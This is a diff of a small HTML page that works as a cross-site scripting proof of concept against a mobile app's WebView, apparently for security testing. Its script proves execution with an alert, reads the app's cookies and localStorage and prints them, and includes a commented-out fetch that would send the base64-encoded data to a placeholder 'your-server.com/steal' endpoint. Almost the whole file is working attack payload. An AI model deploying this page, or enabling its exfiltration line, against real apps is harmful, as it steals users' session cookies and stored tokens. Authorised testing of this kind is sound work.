@@ -1,15 +1,29 @@
-<script>
-    // 1. Prove we can run code (XSS)
-    document.body.style.backgroundColor = "red";
-    document.body.innerHTML = "<h1>Security Test</h1>";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Test</title>
+</head>
+<body>
+    <h1>JavaScript Execution Confirmed</h1>
+    <div id="output">Scanning for data...</div>
 
-    // 2. Try to read APP data (The critical part)
-    // If the WebView shares storage with the rest of the app, this will not be empty.
-    var cookies = document.cookie;
-    var localStore = JSON.stringify(localStorage);
+    <script>
+        // 1. PROOF OF EXECUTION (The "Alert")
+        // This proves JavaScript runs in the app context.
+        alert("XSS Confirmed: JavaScript executing in Trusted Context");
 
-    // 3. Display the data
-    document.body.innerHTML += 
-        "<h3>App Cookies:</h3><div>" + (cookies || "None found") + "</div>" +
-        "<h3>App Storage:</h3><div>" + (localStore || "None found") + "</div>";
-</script>
+        // 2. PROOF OF DATA ACCESS (The "Exfiltration")
+        // This checks if we can steal cookies or tokens.
+        var cookies = document.cookie;
+        var storage = JSON.stringify(localStorage);
+        
+        var message = "Cookies: " + (cookies || "None") + "<br>Storage: " + (storage || "None");
+        
+        document.getElementById("output").innerHTML = message;
+
+        // 3. REPORTING BACK (Optional)
+        // If you want to prove you can send this data to a server:
+        // fetch('https://your-server.com/steal?data=' + btoa(message));
+    </script>
+</body>
+</html>
